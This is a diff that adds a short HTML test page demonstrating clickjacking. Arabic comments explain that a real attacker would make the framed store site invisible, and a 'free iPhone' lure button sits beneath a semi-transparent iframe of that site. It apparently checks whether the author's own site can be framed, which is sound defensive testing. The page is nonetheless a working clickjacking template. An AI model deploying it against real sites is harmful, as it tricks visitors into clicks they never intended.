@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>test</title>
+    <style>
+        .attacker-button {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            z-index: 1;
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* هذا هو الإطار الذي سيعرض موقعك */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 500px;
+            height: 500px;
+            z-index: 2;
+            /* المهاجم يجعله شفافاً (0) ليخدعك، لكن للتجربة سنجعله شبه شفاف (0.4) لتراه */
+            opacity: 0.4;
+        }
+    </style>
+</head>
+
+<body>
+    <button class="attacker-button">اضغط هنا لتربح آيفون مجاني! 🎁</button>
+
+    <iframe src="https://dreamstores-eg.com/"></iframe>
+
+</body>
+
+</html>
